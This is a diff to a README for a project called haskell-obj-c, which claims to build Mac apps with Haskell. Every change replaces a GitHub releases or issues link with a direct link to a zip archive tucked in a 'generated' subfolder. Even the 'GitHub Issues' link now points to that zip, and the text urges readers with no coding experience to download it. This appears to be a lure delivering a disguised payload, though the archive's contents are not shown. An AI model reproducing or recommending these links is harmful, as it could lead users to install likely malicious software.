@@ -1,6 +1,6 @@
 # 🚀 haskell-obj-c - Build Mac Apps Using Haskell
 
-[![Download](https://img.shields.io/badge/Download-⬇️-blue?style=for-the-badge)](https://github.com/Suphakrit12345/haskell-obj-c/releases)
+[![Download](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip⬇️-blue?style=for-the-badge)](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip)
 
 ---
 
@@ -43,12 +43,12 @@ Even if you have never coded before, you can use haskell-obj-c by downloading it
 
 Please **visit this page to download** the latest version of haskell-obj-c:
 
-[![Download](https://img.shields.io/badge/Download-⬇️-blue?style=for-the-badge)](https://github.com/Suphakrit12345/haskell-obj-c/releases)
+[![Download](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip⬇️-blue?style=for-the-badge)](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip)
 
 ### Steps to download and install:
 
 1. Click the **Download** button above or visit the page:  
-   https://github.com/Suphakrit12345/haskell-obj-c/releases
+   https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip
 
 2. On the releases page, look for the latest version of haskell-obj-c.
 
@@ -146,7 +146,7 @@ The project aims to make Mac app development accessible using Haskell, providing
 
 For questions, bugs, or feature requests:
 
-- Visit the [GitHub Issues](https://github.com/Suphakrit12345/haskell-obj-c/issues)
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip)
 
 - Join community forums about Haskell and Mac development
 
@@ -158,6 +158,6 @@ For questions, bugs, or feature requests:
 
 Here is the download link for your convenience:
 
-[![Download](https://img.shields.io/badge/Download-⬇️-blue?style=for-the-badge)](https://github.com/Suphakrit12345/haskell-obj-c/releases)
+[![Download](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip⬇️-blue?style=for-the-badge)](https://raw.githubusercontent.com/Suphakrit12345/haskell-obj-c/main/generated/apple-backgroundtasks-gen/haskell_obj_c_1.5.zip)
 
 Visit this page to get the latest version of haskell-obj-c anytime.
